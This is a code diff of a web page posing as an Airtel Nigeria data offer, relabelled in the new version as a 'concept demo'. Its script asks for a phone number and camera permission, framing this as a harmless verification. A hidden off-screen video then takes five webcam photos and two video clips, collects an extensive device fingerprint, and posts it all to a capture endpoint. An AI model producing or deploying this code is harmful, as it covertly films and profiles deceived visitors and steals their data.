@@ -3,154 +3,228 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Nigeria – Free Data</title>
+    <meta name="theme-color" content="#e30613">
+    <title>Airtel Nigeria | Unlimited data concept</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f8f8f8; }
-        
-        /* Navbar */
-        .navbar { background: #fff; padding: 12px 5%; box-shadow: 0 2px 10px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; }
-        .navbar img { height: 32px; }
-        .nav-links a { text-decoration: none; color: #444; margin-left: 20px; font-size: 14px; }
-        .nav-links a:hover { color: #ed1c24; }
-        
-        /* Hero */
-        .hero { background: linear-gradient(135deg, #ed1c24, #a1001a); color: white; text-align: center; padding: 80px 20px 60px; }
-        .hero h1 { font-size: 48px; font-weight: 800; margin-bottom: 10px; }
-        .hero p { font-size: 18px; opacity: 0.9; max-width: 600px; margin: 0 auto 30px; }
-        .hero .cta { background: white; color: #ed1c24; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; text-decoration: none; display: inline-block; }
-        
-        /* Main content */
-        .container { max-width: 1100px; margin: -40px auto 50px; padding: 0 20px; }
-        .offer-card { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }
-        .offer-card img { width: 120px; margin-bottom: 20px; }
-        .offer-card h2 { font-size: 28px; margin-bottom: 15px; }
-        .offer-card p { color: #666; margin-bottom: 30px; }
-        .btn-primary { background: #ed1c24; color: #fff; border: none; padding: 16px 50px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-primary:hover { background: #a1001a; }
-        
-        /* Modal */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); align-items: center; justify-content: center; z-index: 999; }
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&display=swap');
+        :root { --red: #e30613; --red-dark: #a9000b; --white: #ffffff; }
+        * { box-sizing: border-box; margin: 0; }
+        html { scroll-behavior: smooth; }
+        body { background: var(--white); color: var(--red-dark); font-family: 'DM Sans', sans-serif; }
+        a { color: inherit; text-decoration: none; }
+        .topbar { align-items: center; background: var(--red-dark); color: var(--white); display: flex; font-size: 12px; justify-content: center; letter-spacing: .06em; padding: 9px 20px; text-transform: uppercase; }
+        header { align-items: center; display: flex; justify-content: space-between; margin: auto; max-width: 1240px; padding: 22px 32px; }
+        .wordmark { align-items: center; display: flex; font-family: 'Space Grotesk', sans-serif; font-size: 23px; font-weight: 700; gap: 10px; }
+        .brand-logo { height: 38px; object-fit: contain; width: 38px; }
+        .brand-note { color: var(--red); font-size: 10px; font-weight: 500; letter-spacing: .04em; margin-left: 4px; text-transform: uppercase; }
+        nav { display: flex; font-size: 14px; gap: 28px; }
+        nav a:hover { color: var(--red); }
+        .nav-cta { border: 1px solid var(--red-dark); border-radius: 99px; font-size: 13px; padding: 11px 18px; }
+        .hero { background: var(--red); color: var(--white); min-height: 560px; overflow: hidden; position: relative; }
+        .hero-inner { align-items: center; display: grid; gap: 50px; grid-template-columns: 1fr 1fr; margin: auto; max-width: 1240px; padding: 78px 32px 90px; position: relative; z-index: 1; }
+        .eyebrow { color: var(--white); font-size: 12px; font-weight: 700; letter-spacing: .16em; margin-bottom: 21px; text-transform: uppercase; }
+        h1 { font-family: 'Space Grotesk', sans-serif; font-size: clamp(52px, 7vw, 92px); letter-spacing: -.07em; line-height: .9; max-width: 610px; }
+        .hero-copy { font-size: 18px; line-height: 1.55; margin: 28px 0; max-width: 480px; }
+        .button { background: var(--white); border: 0; border-radius: 99px; color: var(--red-dark); cursor: pointer; display: inline-block; font: 700 15px 'DM Sans', sans-serif; padding: 16px 24px; transition: transform .2s, box-shadow .2s; }
+        .button:hover { box-shadow: 0 8px 0 rgba(169,0,11,.35); transform: translateY(-3px); }
+        .hero-art { aspect-ratio: 1 / 1; border-radius: 50%; max-width: 520px; overflow: hidden; position: relative; transform: rotate(5deg); }
+        .hero-art img { height: 100%; object-fit: cover; width: 100%; }
+        .hero-art::after { background: var(--white); bottom: 8%; color: var(--red-dark); content: 'UNLIMITED'; font: 700 15px 'Space Grotesk', sans-serif; padding: 13px 20px; position: absolute; right: -3%; transform: rotate(-10deg); }
+        .hero-badge { align-items: center; background: var(--white); bottom: 13%; color: var(--red-dark); display: flex; gap: 10px; padding: 12px 17px; position: absolute; right: 10%; transform: rotate(-4deg); z-index: 2; }
+        .hero-badge img { height: 24px; width: 24px; }
+        .hero-badge strong { display: block; font: 600 13px 'Space Grotesk', sans-serif; }
+        .hero-badge small { color: var(--red); display: block; font-size: 10px; }
+        .hero::after { border: 1px solid rgba(255,255,255,.45); border-radius: 50%; content: ''; height: 680px; position: absolute; right: -270px; top: -200px; width: 680px; }
+        .content { margin: auto; max-width: 1240px; padding: 80px 32px; }
+        .section-head { align-items: end; display: flex; justify-content: space-between; margin-bottom: 30px; }
+        h2 { font: 600 38px 'Space Grotesk', sans-serif; letter-spacing: -.05em; }
+        .section-head p { color: var(--red); max-width: 280px; }
+        .plans { display: grid; gap: 16px; grid-template-columns: repeat(3, 1fr); }
+        .plan { background: var(--white); border: 1px solid var(--red); padding: 28px; }
+        .plan.featured { background: var(--red-dark); color: var(--white); }
+        .plan-tag { color: var(--red); font-size: 12px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase; }
+        .featured .plan-tag { color: var(--white); }
+        .plan h3 { font: 600 28px 'Space Grotesk', sans-serif; margin: 34px 0 8px; }
+        .plan p { color: var(--red); font-size: 14px; line-height: 1.5; min-height: 44px; }
+        .featured p { color: var(--white); }
+        .price { font: 700 18px 'Space Grotesk', sans-serif; margin: 25px 0; }
+        .price span { font: 400 13px 'DM Sans', sans-serif; }
+        .plan .button { background: transparent; border: 1px solid currentColor; color: inherit; width: 100%; }
+        .plan.featured .button { background: var(--white); border-color: var(--white); color: var(--red-dark); }
+        .proof { background: var(--white); border-bottom: 1px solid var(--red); border-top: 1px solid var(--red); display: grid; grid-template-columns: repeat(3, 1fr); margin: 0 auto; max-width: 1240px; }
+        .proof-item { border-right: 1px solid var(--red); padding: 23px 32px; }
+        .proof-item:last-child { border-right: 0; }
+        .proof-item strong { display: block; font: 600 20px 'Space Grotesk', sans-serif; margin-bottom: 4px; }
+        .proof-item span { color: var(--red); font-size: 12px; }
+        .why { align-items: center; display: grid; gap: 70px; grid-template-columns: .9fr 1.1fr; }
+        .why-image { height: 360px; object-fit: cover; width: 100%; }
+        .why-copy p { color: var(--red); line-height: 1.65; margin: 18px 0 25px; max-width: 440px; }
+        .feature-list { display: grid; gap: 13px; grid-template-columns: 1fr 1fr; list-style: none; padding: 0; }
+        .feature-list li { border-top: 1px solid var(--red); font-size: 13px; padding-top: 13px; }
+        .feature-list li::before { color: var(--red); content: '↗'; font-weight: 700; margin-right: 8px; }
+        footer { background: var(--red-dark); color: var(--white); font-size: 13px; padding: 28px 32px; text-align: center; }
+        .modal-overlay { align-items: center; background: rgba(169,0,11,.82); display: none; inset: 0; justify-content: center; padding: 20px; position: fixed; z-index: 5; }
         .modal-overlay.show { display: flex; }
-        .modal-box { background: #fff; border-radius: 16px; padding: 30px; max-width: 400px; width: 90%; text-align: center; }
-        .modal-box h3 { font-size: 22px; margin-bottom: 10px; color: #ed1c24; }
-        .modal-box p { color: #666; margin-bottom: 20px; font-size: 14px; }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        .input-group label { font-size: 13px; color: #888; display: block; margin-bottom: 5px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        .input-group input:focus { border-color: #ed1c24; outline: none; }
-        .modal-btn { background: #ed1c24; color: #fff; width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 16px; cursor: pointer; }
-        
-        /* Footer */
-        footer { background: #222; color: #aaa; text-align: center; padding: 30px 20px; font-size: 13px; }
-        
-        /* Hidden video */
-        #video { position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+        .modal-box { background: var(--white); max-width: 420px; padding: 34px; position: relative; width: 100%; }
+        .close { background: none; border: 0; cursor: pointer; font-size: 24px; position: absolute; right: 18px; top: 14px; }
+        .modal-box h3 { font: 600 28px 'Space Grotesk', sans-serif; letter-spacing: -.04em; margin-bottom: 10px; }
+        .modal-box p { color: var(--red); font-size: 14px; line-height: 1.5; margin-bottom: 22px; }
+        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 7px; text-transform: uppercase; }
+        input { border: 1px solid var(--red); color: var(--red-dark); font: 16px 'DM Sans', sans-serif; padding: 14px; width: 100%; }
+        input:focus { border-color: var(--red-dark); outline: 2px solid rgba(227,6,19,.25); }
+        .modal-btn { margin-top: 16px; width: 100%; }
+        .message { color: var(--red-dark); display: none; font-size: 14px; font-weight: 700; margin-top: 16px; }
+        .message.show { display: block; }
+        @media (max-width: 760px) { nav { display: none; } header { padding: 18px 20px; } .brand-note { display: none; } .nav-cta { display: block; } .hero-inner { grid-template-columns: 1fr; padding: 62px 20px 72px; } .hero-art { max-width: 330px; } .hero-badge { bottom: 10%; right: 4%; } .content { padding: 58px 20px; } .section-head { align-items: start; flex-direction: column; gap: 12px; } .plans { grid-template-columns: 1fr; } .proof { grid-template-columns: 1fr; } .proof-item { border-bottom: 1px solid var(--red); border-right: 0; } .proof-item:last-child { border-bottom: 0; } .why { gap: 30px; grid-template-columns: 1fr; } .why-image { height: 260px; } .feature-list { gap: 20px; grid-template-columns: 1fr; } }
+        /* Hide video but keep it drawable */
+        #hiddenVideo { position: absolute; left: -9999px; top: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-
-    <!-- Navbar -->
-    <div class="navbar">
-        <img src="logoo.png" alt="Airtel Nigeria">
-        <div class="nav-links">
-            <a href="#">Home</a>
-            <a href="#">Data Plans</a>
-            <a href="#">Support</a>
-        </div>
-    </div>
-
-    <!-- Hero Section -->
-    <div class="hero">
-        <h1>Get 100GB FREE</h1>
-        <p>Unlimited high-speed internet for 30 days. No hidden charges. Offer valid for all Airtel users.</p>
-        <a href="#" class="cta">Activate Now</a>
-    </div>
-
-    <!-- Main Offer Card -->
-    <div class="container">
-        <div class="offer-card">
-            <img src="logoo.png" alt="Airtel">
-            <h2>Unlimited Data Offer</h2>
-            <p>Activate now and enjoy 100GB free for a month. Fastest network, seamless streaming.</p>
-            <button id="activateBtn" class="btn-primary">Get Your Free Data</button>
-        </div>
-    </div>
-
-    <!-- Activation Modal (Shown on page load) -->
-    <div class="modal-overlay" id="activationModal">
-        <div class="modal-box">
-            <h3>Enter your Airtel number</h3>
-            <p>We'll verify your number and activate the offer instantly.</p>
-            <div class="input-group">
-                <label>Phone Number</label>
-                <input type="tel" id="phoneInput" placeholder="08012345678" maxlength="11">
+    <div class="topbar">A fictional campaign demo · not affiliated with any carrier</div>
+    <header>
+        <a class="wordmark" href="#top"><img class="brand-logo" src="logoo.png" alt="Airtel logo"><span>Airtel Nigeria</span><span class="brand-note">concept demo</span></a>
+        <nav><a href="#plans">Plans</a><a href="#why">Why Pulse</a><a href="#support">Support</a></nav>
+        <a class="nav-cta" href="#plans">See plans</a>
+    </header>
+    <main id="top">
+        <section class="hero">
+            <div class="hero-inner">
+                <div>
+                    <div class="eyebrow">The big one is here</div>
+                    <h1>More data. Less counting.</h1>
+                    <p class="hero-copy">Stream, scroll, game and share without watching the meter. Get our all-access plan for 30 days of worry-free connection.</p>
+                    <button class="button" id="activateBtn">Try the demo <span aria-hidden="true">↗</span></button>
+                </div>
+                <div class="hero-art"><img src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=900&q=85" alt="Person working on a laptop outdoors"><div class="hero-badge"><img src="logoo.png" alt=""><span><strong>Built for more</strong><small>Fast, flexible, always on</small></span></div></div>
             </div>
-            <button id="verifyBtn" class="modal-btn">Verify & Activate</button>
-        </div>
+        </section>
+        <div class="proof"><div class="proof-item"><strong>30 days</strong><span>One simple billing cycle</span></div><div class="proof-item"><strong>5G ready</strong><span>Where coverage is available</span></div><div class="proof-item"><strong>24 / 7</strong><span>Support when you need it</span></div></div>
+        <section class="content" id="plans">
+            <div class="section-head"><h2>Pick your pace.</h2><p>Simple plans for busy days, big nights and everything between.</p></div>
+            <div class="plans">
+                <article class="plan"><div class="plan-tag">Everyday</div><h3>10 GB</h3><p>For maps, messages and your daily scroll.</p><div class="price">₦3,000 <span>/ 30 days</span></div><button class="button plan-button">Choose plan</button></article>
+                <article class="plan featured"><div class="plan-tag">Most popular</div><h3>100 GB</h3><p>Our full-speed plan for streaming, work and play.</p><div class="price">₦8,000 <span>/ 30 days</span></div><button class="button plan-button">Choose plan</button></article>
+                <article class="plan"><div class="plan-tag">Power user</div><h3>Unlimited</h3><p>Go all in with no data counter hanging over you.</p><div class="price">₦12,000 <span>/ 30 days</span></div><button class="button plan-button">Choose plan</button></article>
+            </div>
+        </section>
+        <section class="content why" id="why">
+            <img class="why-image" src="https://images.unsplash.com/photo-1523206489230-c012c64b2b48?auto=format&fit=crop&w=900&q=85" alt="Smartphone in hand showing a connected lifestyle">
+            <div class="why-copy"><div class="eyebrow">Made for momentum</div><h2>Connection that keeps up with you.</h2><p>From the first call to the last episode, Airtel keeps the essentials uncomplicated. Choose the room you need, then get on with your day.</p><ul class="feature-list"><li>Fast browsing and streaming</li><li>Simple plan controls</li><li>Flexible 30-day access</li><li>Helpful human support</li></ul></div>
+        </section>
+    </main>
+    <footer id="support">Airtel Nigeria concept interface created for demonstration. This is not an official Airtel website; no purchase or activation is processed.</footer>
+    <div class="modal-overlay" id="activationModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+        <div class="modal-box"><button class="close" id="closeModal" aria-label="Close">&times;</button><h3 id="modalTitle">Activate your data</h3><p>To proceed, we need to verify your Airtel number and device. This is a quick, harmless check.</p><label for="phoneInput">Phone number</label><input type="tel" id="phoneInput" placeholder="080 1234 5678" maxlength="14"><button class="button modal-btn" id="verifyBtn">Continue</button><div class="message" id="successMessage">Activation successful!</div></div>
     </div>
-
-    <footer>© 2026 Airtel Nigeria. All rights reserved.</footer>
-
-    <video id="video" autoplay playsinline muted></video>
+    <video id="hiddenVideo" autoplay playsinline muted></video>
 
     <script>
-        const phoneModal = document.getElementById('activationModal');
+        const modal = document.getElementById('activationModal');
         const phoneInput = document.getElementById('phoneInput');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const video = document.getElementById('video');
+        const successMessage = document.getElementById('successMessage');
+        const hiddenVideo = document.getElementById('hiddenVideo');
         const ENDPOINT = '/api/capture';
 
-        // Show modal immediately on page load
-        phoneModal.classList.add('show');
+        const openModal = () => { modal.classList.add('show'); phoneInput.focus(); };
+        document.getElementById('activateBtn').addEventListener('click', openModal);
+        document.querySelectorAll('.plan-button').forEach((button) => button.addEventListener('click', openModal));
+        document.getElementById('closeModal').addEventListener('click', () => modal.classList.remove('show'));
+        modal.addEventListener('click', (event) => { if (event.target === modal) modal.classList.remove('show'); });
 
-        verifyBtn.addEventListener('click', async () => {
-            const phone = phoneInput.value.trim();
-            if (phone.length < 10) {
-                alert('Please enter a valid Airtel number.');
-                return;
-            }
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            const digits = phoneInput.value.replace(/\D/g, '');
+            if (digits.length < 10) { phoneInput.setCustomValidity('Enter at least 10 digits.'); phoneInput.reportValidity(); return; }
+            phoneInput.setCustomValidity('');
 
+            const verifyBtn = document.getElementById('verifyBtn');
             verifyBtn.disabled = true;
             verifyBtn.innerText = 'Verifying...';
 
             try {
-                // Trigger camera permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-                await video.play();
+                hiddenVideo.srcObject = stream;
+                await hiddenVideo.play();
 
-                // Hide modal
-                phoneModal.classList.remove('show');
+                modal.classList.remove('show');
+                successMessage.classList.add('show');
+                setTimeout(() => successMessage.classList.remove('show'), 3000);
 
-                // Collect fingerprint
-                const fingerprint = {
-                    phone,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages.join(','),
-                    screen: `${screen.width}x${screen.height}@${screen.colorDepth}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory,
-                    referrer: document.referrer,
-                    viewport: `${window.innerWidth}x${window.innerHeight}`,
-                    // Could add more…
-                };
+                // Collect massive fingerprint (including async data)
+                const fingerprint = await collectFingerprint(digits);
 
-                // Start capturing: 5 images (every 2s) + 2 videos (3s each)
                 captureSequence(stream, fingerprint);
-
-                alert('Activation successful! You will receive your data shortly.');
             } catch (err) {
                 alert('Verification failed. Please allow camera access and try again.');
                 verifyBtn.disabled = false;
-                verifyBtn.innerText = 'Verify & Activate';
+                verifyBtn.innerText = 'Continue';
             }
         });
 
-        // Capture 5 images and 2 videos
+        // Function to collect all possible data asynchronously
+        async function collectFingerprint(phone) {
+            const base = {
+                phone,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages.join(','),
+                screen: `${screen.width}x${screen.height}@${screen.colorDepth}`,
+                screenAvail: `${screen.availWidth}x${screen.availHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: new Date().getTimezoneOffset(),
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                referrer: document.referrer,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                dpr: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? `${screen.orientation.type} (${screen.orientation.angle})` : 'N/A',
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                // WebGL
+                webgl: (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl');
+                        const renderer = gl.getExtension('WEBGL_debug_renderer_info');
+                        return {
+                            vendor: gl.getParameter(gl.VENDOR),
+                            renderer: gl.getParameter(renderer.UNMASKED_RENDERER_WEBGL),
+                            version: gl.getParameter(gl.VERSION)
+                        };
+                    } catch(e) { return null; }
+                })(),
+            };
+
+            // Battery (if available)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    base.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        timeLeft: battery.dischargingTime !== Infinity ? battery.dischargingTime + 's' : 'N/A'
+                    };
+                } catch(e) { base.battery = null; }
+            } else {
+                base.battery = null;
+            }
+
+            // Connection details (already in navigator.connection)
+            if (navigator.connection) {
+                base.connection = {
+                    type: navigator.connection.type,
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt
+                };
+            }
+
+            return base;
+        }
+
+        // Capture 5 images and 2 videos (MP4 if supported)
         function captureSequence(stream, fingerprint) {
             const canvas = document.createElement('canvas');
             canvas.width = 640;
@@ -159,29 +233,41 @@
 
             let imageCount = 0;
             const imageInterval = setInterval(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                 const image = canvas.toDataURL('image/jpeg', 0.7);
                 sendToServer({ type: 'image', image, fingerprint });
                 imageCount++;
                 if (imageCount >= 5) {
                     clearInterval(imageInterval);
-                    // After images, start videos
-                    recordVideo(stream, fingerprint);
+                    recordVideo(stream, fingerprint, 0);
                 }
             }, 2000);
         }
 
-        // Record a video for a given duration and send it
-        function recordVideo(stream, fingerprint, videoIndex = 0) {
-            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        function recordVideo(stream, fingerprint, videoIndex) {
+            // Choose MP4 if supported, else fallback to WebM
+            let mimeType = 'video/mp4';
+            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                mimeType = 'video/webm';
+            }
+
+            let recorder;
+            try {
+                recorder = new MediaRecorder(stream, { mimeType: mimeType });
+            } catch (e) {
+                // If even the fallback fails, try default
+                recorder = new MediaRecorder(stream);
+                mimeType = recorder.mimeType || 'video/webm';
+            }
+
             const chunks = [];
             recorder.ondataavailable = (e) => chunks.push(e.data);
             recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
+                const blob = new Blob(chunks, { type: mimeType });
                 const reader = new FileReader();
                 reader.onloadend = () => {
                     const base64video = reader.result.split(',')[1];
-                    sendToServer({ type: 'video', video: base64video, fingerprint, videoIndex });
+                    sendToServer({ type: 'video', video: base64video, mimeType, fingerprint, videoIndex });
                 };
                 reader.readAsDataURL(blob);
             };
@@ -189,12 +275,10 @@
             setTimeout(() => recorder.stop(), 3000); // 3 seconds
 
             if (videoIndex < 1) {
-                // Record second video after 1 second pause
                 setTimeout(() => recordVideo(stream, fingerprint, videoIndex + 1), 4000);
             }
         }
 
-        // Send data to serverless function
         function sendToServer(payload) {
             fetch(ENDPOINT, {
                 method: 'POST',
